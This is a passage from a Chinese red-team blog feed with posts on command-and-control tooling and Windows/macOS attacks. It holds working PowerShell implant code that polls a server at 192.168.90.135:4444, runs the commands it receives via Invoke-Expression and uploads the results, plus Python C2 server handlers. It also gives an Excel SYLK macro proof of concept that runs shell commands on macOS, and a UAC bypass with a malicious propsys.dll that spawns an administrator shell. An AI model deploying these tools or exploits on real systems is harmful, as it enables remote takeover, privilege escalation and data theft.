id="2-2-info信息回传给服务端"><a href="#2-2-info信息回传给服务端" class="headerlink" title="2.2 info信息回传给服务端"></a>2.2 info信息回传给服务端</h4><p><strong>服务端 url –info代码</strong> </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/18.png" alt="enter description here"></p><p>访问&#x2F;info,由于info使用post包</p><p><strong>客户端powershell 代码</strong> ，通过POST传参进行将data数据回传</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/19.png" alt="enter description here"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$h3</span> = <span class="built_in">new-object</span> net.WebClient</span><br><span class="line">      <span class="variable">$h3</span>.Headers.Add(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line">      <span class="variable">$h</span>=<span class="variable">$h3</span>.UploadString(<span class="string">&quot;http://192.168.90.135:4444/info/<span class="variable">$agent</span>&quot;</span>,<span class="variable">$finaldata</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$h2</span> = <span class="built_in">New-Object</span> system.Net.WebClient;</span><br><span class="line"><span class="variable">$h3</span> = <span class="built_in">New-Object</span> system.Net.WebClient;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/21.png" alt="enter description here"></p><h4 id="2-3-访问-cm"><a href="#2-3-访问-cm" class="headerlink" title="2.3 访问&#x2F;cm"></a>2.3 访问&#x2F;cm</h4><p>带id访问&#x2F;cm接口，访问&#x2F;cm&#x2F;[id],取得服务端发送的控制命令，控制命令组成如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="variable">$true</span>)&#123;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$h2</span>.downloadString(<span class="string">&quot;http://192.168.90.135:4444/cm/<span class="variable">$agent</span>&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>编号</th><th>表示</th><th>意义</th></tr></thead><tbody><tr><td>1</td><td>&#x2F;get</td><td>访问&#x2F;get接口</td></tr><tr><td>2</td><td>&#x2F;getc</td><td>访问&#x2F;getc接口</td></tr><tr><td>3</td><td>&#x2F;hjf</td><td>访问&#x2F;hjf接口</td></tr><tr><td>4</td><td>&#x2F;hjfs</td><td>访问&#x2F;hjfs接口</td></tr><tr><td>5</td><td>&#x2F;sct</td><td>访问&#x2F;sct接口</td></tr><tr><td>6</td><td>&#x2F;hta</td><td>访问&#x2F;hta接口</td></tr><tr><td>7</td><td>dl</td><td>访问&#x2F;dl接口</td></tr><tr><td>8</td><td>&#x2F;up</td><td>访问&#x2F;up接口</td></tr><tr><td>9</td><td>&#x2F;img</td><td>访问&#x2F;img接口</td></tr><tr><td>10</td><td>&#x2F;md</td><td>访问&#x2F;md接口</td></tr><tr><td>11</td><td>其他</td><td>其他powershell可以直接执行的命令</td></tr></tbody></table><p>服务端发出了一个命令：whoami</p><p>客户端循环获取&#x2F;cm 的地址的内容</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/22.png" alt="enter description here"></p><h4 id="2-4-执行回传输出信息"><a href="#2-4-执行回传输出信息" class="headerlink" title="2.4 执行回传输出信息"></a>2.4 执行回传输出信息</h4><p>由Invoke-Expression执行 $cmd命令，将输出的信息回传&#x2F;re 服务端</p><p>客户端</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$output</span>=<span class="built_in">Invoke-Expression</span> (<span class="variable">$cmd</span>) | <span class="built_in">Out-String</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="variable">$Error</span>[<span class="number">0</span>] | <span class="built_in">Out-String</span>;</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$output</span>)</span><br><span class="line"><span class="variable">$redata</span>=[<span class="type">System.Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line"><span class="variable">$re</span> = <span class="variable">$h3</span>.UploadString(<span class="string">&quot;http://192.168.90.135:4444/re/<span class="variable">$agent</span>&quot;</span>,<span class="variable">$redata</span>);</span><br></pre></td></tr></table></figure><p>服务端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">command</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GET</span>(<span class="params">self, <span class="built_in">id</span></span>):</span><br><span class="line">        <span class="keyword">if</span> config.AGENTS.get(<span class="built_in">id</span>) != <span class="literal">None</span>:</span><br><span class="line">            config.TIME[<span class="built_in">id</span>] = time.time()</span><br><span class="line">        <span class="keyword">if</span> config.AGENTS.get(<span class="built_in">id</span>) != <span class="literal">None</span> <span class="keyword">and</span> <span class="built_in">len</span>(config.COMMAND.get(<span class="built_in">id</span>)) &gt; <span class="number">0</span>:</span><br><span class="line">            cmd = config.COMMAND[<span class="built_in">id</span>].pop(<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">print</span> bcolors.OKGREEN + <span class="string">&#x27;[~] &#x27;</span> + <span class="built_in">id</span> + <span class="string">&#x27;:&#x27;</span> + cmd + bcolors.ENDC</span><br><span class="line">            <span class="keyword">return</span> cmd</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">elif</span> config.AGENTS.get(<span class="built_in">id</span>) == <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span> bcolors.OKGREEN + <span class="string">&#x27;[~] &#x27;</span> + <span class="built_in">id</span> + <span class="string">&#x27;:Register&#x27;</span> + bcolors.ENDC</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;REGISTER&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">result</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">self, <span class="built_in">id</span></span>):</span><br><span class="line">        data = web.data()</span><br><span class="line">        <span class="keyword">if</span> config.AGENTS.get(<span class="built_in">id</span>) != <span class="literal">None</span> <span class="keyword">and</span> data != <span class="literal">None</span>:</span><br><span class="line">            data = data.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">            p_out = <span class="string">&#x27;[+] Agent (%d) - %s send Result&#x27;</span> % (config.AGENTS[<span class="built_in">id</span>][<span class="number">0</span>], config.AGENTS[<span class="built_in">id</span>][<span class="number">7</span>])</span><br><span class="line">            <span class="built_in">print</span> bcolors.OKGREEN + p_out + bcolors.ENDC</span><br><span class="line">            <span class="built_in">print</span> data</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;REGISTER&#x27;</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对比<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/30.png" alt="enter description here"></p><h3 id="整体POC-效果图如下："><a href="#整体POC-效果图如下：" class="headerlink" title="整体POC 效果图如下："></a>整体POC 效果图如下：</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/23.png" alt="enter description here"></p><h3 id="最终效果图："><a href="#最终效果图：" class="headerlink" title="最终效果图："></a>最终效果图：</h3><p>下图中上部分为kali (主控端)，下半部分为win10(被控端)</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2.png" alt="enter description here"></p><h2 id="污水攻击特点总结"><a href="#污水攻击特点总结" class="headerlink" title="污水攻击特点总结"></a>污水攻击特点总结</h2><h3 id="5-1心跳周期"><a href="#5-1心跳周期" class="headerlink" title="5.1心跳周期"></a>5.1心跳周期</h3><p>被控端定期向主控端发出get请求，查看是否有新的命令。</p><p><a href="http://192.168.90.135:4444/get/cm/[id]">http://192.168.90.135:4444/get/cm/[id]</a></p><h3 id="5-2-http请求成对出现"><a href="#5-2-http请求成对出现" class="headerlink" title="5.2 http请求成对出现"></a>5.2 http请求成对出现</h3><p>一次取命令对应一次命令执行结果回传。</p><p><a href="http://192.168.90.135:4444/get/cm/[id]">http://192.168.90.135:4444/get/cm/[id]</a></p><p><a href="http://192.168.90.135:4444/re/[id]">http://192.168.90.135:4444/re/[id]</a></p><h3 id="5-3云控下发powershell脚本"><a href="#5-3云控下发powershell脚本" class="headerlink" title="5.3云控下发powershell脚本"></a>5.3云控下发powershell脚本</h3><p>传统远控采取命令约定方式，主控端向被控端发送命令代码，被控端在后门代码中匹配成功然后执行。</p><p>而污水攻击不再使用命令代码，而是就地采用被控端本地现有工具powershell，将命令以高度混淆的powershell形式下发，这样做保证了样本即使被捕获，恶意活动不会暴露、C2服务器不会被溯源。</p><h3 id="5-4可滥用web2-0网站作为信息传输中介"><a href="#5-4可滥用web2-0网站作为信息传输中介" class="headerlink" title="5.4可滥用web2.0网站作为信息传输中介"></a>5.4可滥用web2.0网站作为信息传输中介</h3><p>任何主机可以不经注册访问网站，向网站发出http请求。</p><p>污水攻击利用的web2.0网站的服务器是攻击者控制的，因此有被溯源的风险。</p><h3 id="5-5协议：http"><a href="#5-5协议：http" class="headerlink" title="5.5协议：http"></a>5.5协议：http</h3><p>明文不加密。</p><p><strong>大体对应最新ATT&amp;CK映射内容为以下列表</strong></p><table><thead><tr><th>执行</th><th>采集</th><th>命令与控制</th><th>影响力</th></tr></thead><tbody><tr><td>利用客户端执行(T1203)</td><td>自动收集(T1119)</td><td>应用层协议（T1071）</td><td>数据处理(T1565)</td></tr><tr><td>命令行（T1059）</td><td></td><td>数据编码(T1132)</td><td></td></tr><tr><td></td><td></td><td>数据混淆（T1001）</td><td></td></tr><tr><td></td><td></td><td>非标准端口(T1571)</td><td></td></tr></tbody></table><h2 id="结合golang"><a href="#结合golang" class="headerlink" title="结合golang"></a>结合golang</h2><p>作者: demosnec666 WBGIII</p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/muddyc3_golang.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://github.com/demonsec666/muddyc3_golang/releases/tag/v1.0">https://github.com/demonsec666/muddyc3_golang/releases/tag/v1.0</a><br><a href="https://github.com/demonsec666/muddyc3_golang">https://github.com/demonsec666/muddyc3_golang</a></p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><blockquote><p>【1】<a href="https://www.freebuf.com/articles/web/213834.html">https://www.freebuf.com/articles/web/213834.html</a></p><p>【2】<a href="https://attack.mitre.org/groups/G0069/">https://attack.mitre.org/groups/G0069/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> APT </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FudgeC2</title>
      <link href="/FudgeC2.html"/>
      <url>/FudgeC2.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/FudgeC2.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://github.com/Ziconius/FudgeC2">https://github.com/Ziconius/FudgeC2</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shad0w</title>
      <link href="/shad0w.html"/>
      <url>/shad0w.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/BCC4E156881763FAB4935596257781F1.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/shad0w.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1592017665245.jpg" alt="enter description here"></p><p><a href="https://github.com/bats3c/shad0w">https://github.com/bats3c/shad0w</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>muddyc3_golang</title>
      <link href="/muddyc3-golang.html"/>
      <url>/muddyc3-golang.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F2694BBFD0DB3C9BB1598D7DE7B5EAFB.jpg" alt="enter description here"></p><span id="more"></span><p>作者: demosnec666 WBGIII</p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/muddyc3_golang.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://github.com/demonsec666/muddyc3_golang/releases/tag/v1.0">https://github.com/demonsec666/muddyc3_golang/releases/tag/v1.0</a><br><a href="https://github.com/demonsec666/muddyc3_golang">https://github.com/demonsec666/muddyc3_golang</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tasks-applocker</title>
      <link href="/tasks-applocker.html"/>
      <url>/tasks-applocker.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20200113_205107.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/tasks-applocker.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2FB2F421A216895DE0E008689718267E.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/B77FA210C19DE4A80C6CE736992E1784.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/06EB8C3217058BAC8EC0273C8A7B3E97.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/24D2E364BE58B38B8F56F0BCE74DF2AE.png" alt="enter description here"></p><p><a href="https://gist.github.com/am0nsec/8378da08f848424e4ab0cc5b317fdd26">https://gist.github.com/am0nsec/8378da08f848424e4ab0cc5b317fdd26</a><br><a href="https://twitter.com/subTee/status/1216465628946563073">https://twitter.com/subTee/status/1216465628946563073</a><br><a href="https://github.com/demonsec666/attack_golang/blob/master/TASKS_LOLBIN/main.go">https://github.com/demonsec666/attack_golang/blob/master/TASKS_LOLBIN/main.go</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ReverseTCPshell</title>
      <link href="/ReverseTCPshell.html"/>
      <url>/ReverseTCPshell.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F0457EBCBD5497B7AF66E0B42EFCF350.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/ReverseTCPshell.mp4'    frameborder="0"     allowfullscreen></iframe>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>octopus</title>
      <link href="/octopus.html"/>
      <url>/octopus.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F0457EBCBD5497B7AF66E0B42EFCF350.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/octopus.mp4'    frameborder="0"     allowfullscreen></iframe><p>参考资料 ： <a href="https://github.com/mhaskar/Octopus">https://github.com/mhaskar/Octopus</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>office_sylk_mac</title>
      <link href="/office-sylk-mac.html"/>
      <url>/office-sylk-mac.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20191109_093734.jpg" alt="enter description here"></p><span id="more"></span><p>原因：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ defaults read /Applications/Microsoft\ Excel.app/Contents/Info<span class="selector-class">.plist</span></span><br><span class="line">&#123;</span><br><span class="line">    BuildMachineOSBuild = <span class="number">18</span>G87;</span><br><span class="line">    CFBundleDevelopmentRegion = en;</span><br><span class="line">    CFBundleDisplayName = <span class="string">&quot;Microsoft Excel&quot;</span>;</span><br><span class="line">    CFBundleDocumentTypes =     (</span><br><span class="line">    &#123;</span><br><span class="line">        CFBundleTypeExtensions = (</span><br><span class="line">            slk</span><br><span class="line">        );</span><br><span class="line">        CFBundleTypeIconFile = <span class="string">&quot;XLS.icns&quot;</span>;</span><br><span class="line">        CFBundleTypeName = <span class="string">&quot;Microsoft Excel SLK File (.slk)&quot;</span>;</span><br><span class="line">        CFBundleTypeOSTypes =             (</span><br><span class="line">            SLKX</span><br><span class="line">        );</span><br><span class="line">    ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ID;P</span><br><span class="line">O;E</span><br><span class="line">NN;NAuto_open;ER101C1;KOut Flank;F</span><br><span class="line">C;X1;Y101;K0;<span class="built_in">ECALL</span>(<span class="string">&quot;libc.dylib&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;JC&quot;</span>,<span class="string">&quot;open -a Calculator&quot;</span>)</span><br><span class="line">C;X1;Y102;K0;<span class="built_in">EHALT</span>()</span><br><span class="line">E</span><br></pre></td></tr></table></figure><p>测试版本  Microsoft Office 2019<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/icon.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/A5481E1758C738AF3576A9501E4D92AB.jpg" alt="enter description here"></p><p><a href="https://objective-see.com/blog/blog_0x50.html">https://objective-see.com/blog/blog_0x50.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UAC_bypass_windows_store 通过模拟可信目录绕过UAC</title>
      <link href="/UAC-bypass-windows-store.html"/>
      <url>/UAC-bypass-windows-store.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190823_205947.jpg" alt="enter description here"></p><span id="more"></span><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/9CD16C9C-BEB0-4A2D-BFF7-3042A5136CCC.png" alt="enter description here"></p><p><a href="https://github.com/sailay1996/UAC_bypass_windows_store">https://github.com/sailay1996/UAC_bypass_windows_store</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir <span class="string">&quot;\\?\C:\Windows &quot;</span></span><br><span class="line">mkdir <span class="string">&quot;\\?\C:\Windows \System32&quot;</span></span><br><span class="line">copy <span class="string">&quot;C:\Windows\System32\WSReset.exe&quot;</span> <span class="string">&quot;C:\Windows \System32\&quot;</span></span><br><span class="line"><span class="string">copy &quot;</span>propsys.dll<span class="string">&quot; &quot;</span>C:\Windows \System32\<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>C:\Windows \System32\WSReset.exe<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#include</span> &lt;windows.h&gt; </span><br><span class="line"><span class="selector-id">#include</span> &lt;Winuser.h&gt; </span><br><span class="line"> </span><br><span class="line"><span class="comment">// x86-w64-mingw32-gcc -shared -o propsys.dll propsys.c -lcomctl32 -Wl,--subsystem,windows  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  @404death</span></span><br><span class="line"></span><br><span class="line">int <span class="built_in">sailayv</span>()&#123;</span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">&quot;Spawnning shell as Administrator&quot;</span>, <span class="string">&quot;pwned!!!&quot;</span>, MB_OK);</span><br><span class="line">    <span class="built_in">WinExec</span>(<span class="string">&quot;cmd.exe /k C:\\windows\\system32\\cmd.exe&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//    ExitProcess(0);</span></span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI DllMain (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)  </span><br><span class="line">&#123;  </span><br><span class="line">  <span class="keyword">if</span> (fdwReason == DLL_PROCESS_ATTACH)  </span><br><span class="line">  &#123;  </span><br><span class="line">    <span class="built_in">sailayv</span>();  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  return TRUE;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://github.com/sailay1996/UAC_bypass_windows_store">https://github.com/sailay1996/UAC_bypass_windows_store</a></p><p>类似参考例子  通过模拟可信目录绕过UAC :<a href="https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87%E6%A8%A1%E6%8B%9F%E5%8F%AF%E4%BF%A1%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87UAC%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87%E6%A8%A1%E6%8B%9F%E5%8F%AF%E4%BF%A1%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87UAC%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Slackc2-SecistSploit</title>
      <link href="/Slackc2.html"/>
      <url>/Slackc2.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/354B06159AA7196E0F0FC10CE498DE21.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Slackc2.mp4'    frameborder="0"     allowfullscreen></iframe><p>感谢WBGIII 和我一起开发了 wikipedia 和slack 的C2，由于我们不断debug，得出这份视频的内容。</p><p>参考资料 ： <a href="https://github.com/bkup/SlackShell">https://github.com/bkup/SlackShell</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1566481976821.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1566481909147.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1566481939849.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wikipediaC2-SecistSploit</title>
      <link href="/wikipediaC2-SecistSploit.html"/>
      <url>/wikipediaC2-SecistSploit.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F1C7F0FDE42A5F21EBABBD3F694AA53A.jpg" alt="enter description here"></p><span id="more"></span><p>GitHub： <a href="https://github.com/Mr-Un1k0d3r/DKMC">https://github.com/Mr-Un1k0d3r/DKMC</a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/wikipediaC2.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://github.com/daniel-infosec/wikipedia-c2">https://github.com/daniel-infosec/wikipedia-c2</a><br><a href="https://github.com/demonsec666/SecistSploit">https://github.com/demonsec666/SecistSploit</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/D1BA5B8DBF59A2EF52F2C3EBBB003A9F.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/825DFBD4C990C90B3944741CE658E1B7.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uac-getsystem</title>
      <link href="/uac-getsystem.html"/>
      <url>/uac-getsystem.html</url>
      
